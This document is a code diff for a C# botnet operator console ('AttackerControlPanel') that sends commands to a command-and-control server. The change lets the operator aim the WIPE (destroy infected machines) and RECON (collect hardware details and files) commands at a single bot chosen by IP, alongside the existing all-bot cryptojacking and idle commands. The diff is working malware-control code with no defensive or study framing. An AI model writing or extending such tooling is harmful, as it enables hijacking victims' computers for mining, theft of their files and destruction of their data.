@@ -93,30 +93,27 @@ public class AttackerControlPanel
     static void ShowMenu()
     {
         Console.ForegroundColor = ConsoleColor.Yellow;
-        Console.WriteLine("--- Bot Commands ---");
+        Console.WriteLine("--- Global Commands (Apply to ALL) ---");
         Console.ResetColor();
-        Console.WriteLine(" [1] Command: CRYPTOJACK (Start mining)");
+        Console.WriteLine(" [1] Command: CRYPTOJACK (Start mining all)");
         Console.WriteLine(" [2] Command: IDLE (Stop all tasks)");
 
-        // === THÊM LỆNH WIPE ===
+        // === THÊM LỆNH WIPE VÀ RECON ===
         Console.ForegroundColor = ConsoleColor.Red;
-        Console.WriteLine(" [3] Command: WIPE (!!! DESTROY TARGETS !!!)");
-        Console.ResetColor();
-
-        Console.ForegroundColor = ConsoleColor.Magenta;
-        Console.WriteLine(" [4] Command: RECON (Gather Hardware & Files)");
+        Console.WriteLine("\n--- Targeted Commands (Specific Bot) ---");
+        Console.WriteLine(" [3] Command: WIPE (Select a target)");
+        Console.WriteLine(" [4] Command: RECON (Select a target)");
         Console.ResetColor();
 
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("\n--- Monitoring ---");
         Console.ResetColor();
         Console.WriteLine(" [5] List all active Bots");
-        Console.WriteLine(" [6] View collected Results");
 
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("\n--- System ---");
         Console.ResetColor();
-        Console.WriteLine(" [7] Refresh Menu");
+        Console.WriteLine(" [6] Refresh Menu");
         Console.WriteLine(" [0] Exit Panel");
         Console.WriteLine();
     }
@@ -126,40 +123,21 @@ public class AttackerControlPanel
         switch (choice)
         {
             case "1":
-                await SendCommandToServer("cryptojack");
+                await SendCommandToServer("cryptojack", "ALL");
                 break;
             case "2":
-                await SendCommandToServer("idle");
+                await SendCommandToServer("idle", "ALL");
                 break;
             case "3":
-                // Thêm xác nhận an toàn trước khi Wipe
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.Write("WARNING: This will destroy all infected machines. Are you sure? (y/n): ");
-                string confirm = Console.ReadLine();
-                Console.ResetColor();
-                if (confirm?.ToLower() == "y")
-                {
-                    await SendCommandToServer("wipe");
-                }
-                else
-                {
-                    Console.WriteLine("Operation cancelled.");
-                }
+                await HandleTargetedCommand("wipe");
                 break;
             case "4":
-                // === GỬI LỆNH RECON ===
-                await SendCommandToServer("recon");
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.WriteLine("NOTE: Recon reports will be saved as .txt files on the C&C Server folder.");
-                Console.ResetColor();
+                await HandleTargetedCommand("recon");
                 break;
             case "5":
                 await ListBots();
                 break;
             case "6":
-                await ViewResults();
-                break;
-            case "7":
                 // Refresh (không làm gì cả, vòng lặp sẽ tự vẽ lại menu)
                 return false;
             case "0":
@@ -172,21 +150,115 @@ public class AttackerControlPanel
         }
         return false;
     }
-
-    static async Task SendCommandToServer(string command)
+    // Hàm mới để xử lý việc chọn Bot
+    static async Task HandleTargetedCommand(string command)
     {
-        Console.WriteLine($"Issuing command '{command}'...");
+        Console.WriteLine("Fetching bot list for target selection...");
         try
         {
-            var payload = new { Command = command };
+            string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/list");
+            var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse, _jsonOptions);
+
+            if (bots == null || bots.Count == 0)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("No bots available to target.");
+                Console.ResetColor();
+                return;
+            }
+
+            Console.WriteLine($"\nSelect a bot to {command.ToUpper()}:");
+            Console.WriteLine(" [0] CANCEL");
+
+            for (int i = 0; i < bots.Count; i++)
+            {
+                var bot = bots[i];
+                var statusColor = bot.Status == "WIPING" ? ConsoleColor.Red : ConsoleColor.Green;
+                Console.Write($" [{i + 1}] {bot.BotIp} ");
+                Console.ForegroundColor = statusColor;
+                Console.WriteLine($"({bot.Status})");
+                Console.ResetColor();
+            }
+
+            Console.Write("Your choice: ");
+            string input = Console.ReadLine()?.Trim().ToUpper();
+
+            if (input == "0") return;
+
+            //string targetIp = "";
+
+            //if (input == "A")
+            //{
+            //    if (command == "wipe")
+            //    {
+            //        Console.ForegroundColor = ConsoleColor.Red;
+            //        Console.Write("WARNING: You are about to WIPE ALL BOTS. Confirm? (y/n): ");
+            //        if (Console.ReadLine()?.ToLower() != "y") return;
+            //    }
+            //    targetIp = "ALL";
+            //}
+            //else if (int.TryParse(input, out int index) && index > 0 && index <= bots.Count)
+            //{
+            //    targetIp = bots[index - 1].BotIp;
+            //}
+            //else
+            //{
+            //    Console.WriteLine("Invalid selection.");
+            //    return;
+            //}
+
+            //if (command == "wipe" && targetIp != "ALL")
+            //{
+            //    Console.ForegroundColor = ConsoleColor.Red;
+            //    Console.Write($"Confirm WIPE on target {targetIp}? (y/n): ");
+            //    Console.ResetColor();
+            //    if (Console.ReadLine()?.ToLower() != "y") return;
+            //}
+            if (!int.TryParse(input, out int index) || index < 1 || index > bots.Count)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Invalid selection. Must choose a number from the list.");
+                Console.ResetColor();
+                return;
+            }
+            string targetIp = bots[index - 1].BotIp;
+            if (command == "wipe")
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write($"⚠ WARNING: Confirm WIPE on target {targetIp}? (y/n): ");
+                Console.ResetColor();
+                if (Console.ReadLine()?.ToLower() != "y")
+                {
+                    Console.WriteLine("Operation cancelled.");
+                    return;
+                }
+            }
+
+            await SendCommandToServer(command, targetIp);
+        }
+        catch (Exception ex)
+        {
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine($"Error fetching bot list: {ex.Message}");
+            Console.ResetColor();
+        }
+    }
+
+
+    static async Task SendCommandToServer(string command, string targetIp)
+    {
+        string targetDisplay = targetIp == "ALL" ? "ALL BOTS" : targetIp;
+        Console.WriteLine($"Issuing command '{command}' to {targetDisplay}...");
+        try
+        {
+            var payload = new { Command = command, TargetBotIp = targetIp };
             var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
             HttpResponseMessage response = await client.PostAsync($"{CncServerUrl}/bot/setcommand", content);
 
             if (response.IsSuccessStatusCode)
             {
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine($"SUCCESS: Command '{command}' was accepted by the server.");
-                Console.WriteLine("All bots checking in will now receive this command.");
+                Console.WriteLine($"SUCCESS: Command '{command}' set for {targetDisplay}.");
             }
             else
             {
